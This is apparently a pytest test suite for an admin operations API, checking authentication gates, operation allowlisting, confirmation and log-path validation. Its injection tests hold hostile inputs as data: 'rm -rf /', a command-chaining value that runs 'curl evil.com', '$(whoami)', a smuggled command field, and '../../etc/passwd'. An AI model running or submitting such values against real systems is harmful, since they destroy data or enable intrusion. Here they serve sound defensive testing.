"""HTTP contract for the Operations Center.

The critical property is not "does it work" but "can anyone escalate it": an
anonymous caller, a normal user, or a crafted body must never be able to run
anything. These tests drive the real FastAPI app with dependency overrides so
the real `require_admin` gate is exercised, not a mock.
"""
import pytest
from fastapi.testclient import TestClient

from backend.app.main import app
from backend.app.core.auth import AuthUser
from backend.app.auth.api import dependencies as deps
from backend.app.services.admin import ops_service as ops


def _admin() -> AuthUser:
    return AuthUser(id="u-admin", email="admin@tezlify.test", is_admin=True)


def _client(monkeypatch, admin_email: str = "admin@tezlify.test") -> TestClient:
    """Authenticated client for `admin_email`.

    `require_admin` re-derives admin-ness from settings.ADMIN_EMAILS rather than
    trusting the token, so BOTH the identity and the configured allowlist are
    provided here. The gate itself stays real — only the login is stubbed.
    """
    from backend.app.core.config import settings
    monkeypatch.setattr(settings, "ADMIN_EMAILS", [admin_email])

    def _ok() -> AuthUser:
        return AuthUser(id="u-1", email=admin_email, is_admin=True)

    app.dependency_overrides[deps.get_current_user_unified] = _ok
    return TestClient(app)


def _anon_client() -> TestClient:
    def _boom():
        from fastapi import HTTPException
        raise HTTPException(status_code=401, detail="not authenticated")

    app.dependency_overrides[deps.get_current_user_unified] = _boom
    return TestClient(app)


@pytest.fixture(autouse=True)
def _clear_overrides():
    yield
    app.dependency_overrides.clear()
    ops._op_registry.clear()
    ops._order.clear()
    ops._inflight.clear()
    ops._cooldowns.clear()
    ops._cooldowns.clear()


# ------------------------------------------------------------------ guards
def test_anonymous_cannot_reach_ops():
    client = _anon_client()
    for path in ("/api/v1/admin/ops/status", "/api/v1/admin/ops/catalogue",
                 "/api/v1/admin/ops/health", "/api/v1/admin/ops/audit"):
        assert client.get(path).status_code == 401, path


def test_non_admin_cannot_reach_ops(monkeypatch):
    """An authenticated non-admin is refused by the REAL require_admin gate."""
    from backend.app.core.config import settings
    monkeypatch.setattr(settings, "ADMIN_EMAILS", ["someone-else@tezlify.test"])
    app.dependency_overrides.clear()  # use the real require_admin chain
    client = TestClient(app)
    assert client.get("/api/v1/admin/ops/status").status_code in (401, 403)


def test_admin_can_read_status(monkeypatch):
    client = _client(monkeypatch)
    res = client.get("/api/v1/admin/ops/status")
    assert res.status_code == 200, res.text
    body = res.json()
    # Contract: the payload the Operations Center header depends on.
    assert "services" in body and "health" in body
    assert "catalogue" in body and "audit" in body
    assert isinstance(body["catalogue"], list) and body["catalogue"]


def test_catalogue_exposes_only_allowlisted_names(monkeypatch):
    client = _client(monkeypatch)
    res = client.get("/api/v1/admin/ops/catalogue")
    assert res.status_code == 200
    names = {c["name"] for c in res.json()}
    assert names == set(ops.OPERATIONS)
    assert "db" not in names  # not restartable from the panel


# ------------------------------------------------------------------ mutation
def test_start_operation_requires_confirmation(monkeypatch):
    client = _client(monkeypatch)
    res = client.post("/api/v1/admin/ops/operations",
                      json={"name": "restart_gateway", "confirm": False})
    assert res.status_code == 400
    assert "confirm" in res.json()["detail"].lower()


def test_start_unknown_operation_rejected(monkeypatch):
    client = _client(monkeypatch)
    for payload in [
        {"name": "rm -rf /", "confirm": True},
        {"name": "restart_gateway; curl evil.com", "confirm": True},
        {"name": "$(whoami)", "confirm": True},
    ]:
        res = client.post("/api/v1/admin/ops/operations", json=payload)
        assert res.status_code == 400, payload


def test_cannot_smuggle_a_command_field(monkeypatch):
    """Extra fields must not create a command path."""
    client = _client(monkeypatch)
    res = client.post("/api/v1/admin/ops/operations", json={
        "name": "git_status", "confirm": True, "command": "rm -rf /",
    })
    # Either rejected or the extra field is ignored; it must never run.
    if res.status_code == 202:
        started = ops.get_operation(res.json()["id"])
        assert started["name"] == "git_status"
    else:
        assert res.status_code in (400, 422)


def test_concurrent_start_returns_409(monkeypatch):
    """A second operation in the same family must be refused with 409.

    The guard is asserted directly against the in-flight registry rather than
    by racing a real command: the point under test is that `start_operation`
    refuses while `_inflight` holds a running sibling.
    """
    client = _client(monkeypatch)

    # Simulate an operation that is genuinely mid-flight.
    ops._inflight["restart"] = "op-in-flight"
    ops._op_registry["op-in-flight"] = {
        "id": "op-in-flight", "name": "restart_gateway", "label": "Restart WhatsApp gateway",
        "status": "running", "step": "running", "started_at": None, "finished_at": None,
        "duration_ms": None, "actor": "admin@tezlify.test", "destructive": True,
        "error": None, "logs": [], "exit_code": None,
    }
    try:
        res = client.post("/api/v1/admin/ops/operations",
                          json={"name": "restart_backend", "confirm": True})
        assert res.status_code == 409, res.text
        # A DIFFERENT family is not blocked by the restart guard.
        other = client.post("/api/v1/admin/ops/operations",
                            json={"name": "deploy_build", "confirm": True})
        assert other.status_code in (202, 409), other.text
    finally:
        ops._inflight.clear()
        ops._op_registry.clear()


def test_operation_lookup_404_for_unknown_id(monkeypatch):
    client = _client(monkeypatch)
    assert client.get("/api/v1/admin/ops/operations/does-not-exist").status_code == 404


# ------------------------------------------------------------------ logs
def test_logs_reject_unknown_service(monkeypatch):
    client = _client(monkeypatch)
    res = client.get("/api/v1/admin/ops/logs", params={"service": "../../etc/passwd"})
    assert res.status_code == 400


def test_logs_tail_is_bounded_by_query_validation(monkeypatch):
    client = _client(monkeypatch)
    # 99999 exceeds the declared maximum and must be rejected by validation.
    assert client.get("/api/v1/admin/ops/logs",
                      params={"service": "backend", "tail": 99999}).status_code == 422
